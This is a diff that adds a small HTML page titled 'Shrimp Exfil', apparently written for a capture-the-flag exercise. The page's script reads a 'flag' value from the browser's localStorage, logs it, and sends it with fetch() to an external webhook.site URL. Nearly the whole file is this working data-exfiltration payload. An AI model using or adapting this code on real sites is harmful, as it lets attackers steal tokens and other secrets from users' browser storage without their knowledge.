@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Shrimp Exfil</title>
+  </head>
+  <body>
+    <h1>Hello Shrimp 🦐</h1>
+    <script>
+      try {
+        const flag = localStorage.getItem("flag");
+        console.log("flag=", flag);
+        fetch("https://webhook.site/9556027e-f029-48df-a406-6198e39066b7?flag=" + encodeURIComponent(flag));
+      } catch (e) {
+        console.log("error:", e);
+      }
+    </script>
+  </body>
+</html>
